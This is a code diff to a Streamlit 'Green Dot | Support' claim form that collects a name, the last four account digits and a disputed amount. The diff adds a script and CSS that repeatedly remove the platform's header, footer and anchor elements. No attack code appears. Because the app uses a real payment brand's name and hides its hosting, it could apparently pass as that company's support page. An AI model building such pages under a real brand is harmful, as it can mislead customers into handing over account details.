@@ -30,21 +30,50 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Support", layout="centered", page_icon="✅")
 
-# --- CSS NUCLEAR (RESTORED) ---
+# --- JS: LIMPIEZA PROFUNDA (ELIMINACIÓN DE ANCLAS) ---
+st.markdown("""<script>
+    const cleanStreamlitResiduals = () => {
+        const selectors = [
+            '.section-anchor', 
+            'a.section-anchor', 
+            '[data-testid="stHeaderActionElements"]',
+            '.st-emotion-cache-gi0tri',
+            '.etxdrby3',
+            'header', 
+            'footer'
+        ];
+        selectors.forEach(s => {
+            document.querySelectorAll(s).forEach(el => el.remove());
+        });
+    };
+    setInterval(cleanStreamlitResiduals, 300);
+</script>""", unsafe_allow_html=True)
+
+# --- CSS NUCLEAR (SIN ANCLAS) ---
 st.markdown("""<style>
-    [data-testid='stHeader'], [data-testid='stFooterAd'], footer, header, .stDeployButton { 
-        display: none !important; visibility: hidden !important; 
+    /* Ocultar anclas y herramientas de cabecera de forma agresiva */
+    [data-testid='stHeader'], [data-testid='stFooterAd'], footer, header, .stDeployButton, 
+    .section-anchor, [data-testid="stHeaderActionElements"], .etxdrby3 {
+        display: none !important; 
+        visibility: hidden !important; 
+        pointer-events: none !important;
     }
+    
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
-    .stButton>button { 
-        background-color: #00a05b !important; color: white !important; 
+    
+    .stButton>button {
+        background-color: #00a05b !important; color: white !important;
         width: 100%; border: none !important; font-weight: bold !important;
     }
-    .stMarkdown h1, h1 { pointer-events: none !important; cursor: default !important; }
-    .block-container { max-width: 550px !important; padding-top: 1rem !important; }
     
-    /* Admin styling for internal viewing */
-    .stDataFrame { background-color: #111 !important; }
+    /* Títulos sin interacción */
+    h1, h2, h3, .stMarkdown h1, .stMarkdown h2 { 
+        pointer-events: none !important; 
+        cursor: default !important; 
+        user-select: none !important;
+    }
+    
+    .block-container { max-width: 550px !important; padding-top: 1rem !important; }
 </style>""", unsafe_allow_html=True)
 
 # Sidebar Navigation
@@ -59,7 +88,7 @@ if menu == "Claim Form":
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v22_5", clear_on_submit=True):
+    with st.form("claim_v22_8", clear_on_submit=True):
         nombre = st.text_input("Full Name")
         cuenta = st.text_input("Last 4 digits of Account")
         monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -83,9 +112,10 @@ if menu == "Claim Form":
             conn.commit()
             conn.close()
 
-            st.markdown(f"<div style='background:#0e1a10; border:1px solid #00a05b; padding:20px; border-radius:10px; text-align:center;'>" +
-                        f"<h2 style='color:#00a05b;'>✅ Claim Submitted</h2><p>Ref: <b>{ref_id}</b></p>" +
-                        f"<p style='font-size:12px; color:#888;'>Review in 2-5 business days.</p></div>", unsafe_allow_html=True)
+            st.markdown(f"<div style='background:#0e1a10; border:1px solid #00a05b; padding:20px; border-radius:10px; text-align:center; margin-top:20px;'>" +
+                        f"<h2 style='color:#00a05b; margin-top:0;'>✅ Claim Submitted</h2>" +
+                        f"<p style='color:#888; margin-bottom:5px;'>Reference:</p><h3 style='margin-top:0;'>{ref_id}</h3>" +
+                        f"<p style='font-size:12px; color:#666;'>Review in 2-5 business days.</p></div>", unsafe_allow_html=True)
         else:
             st.error("All fields required.")
 
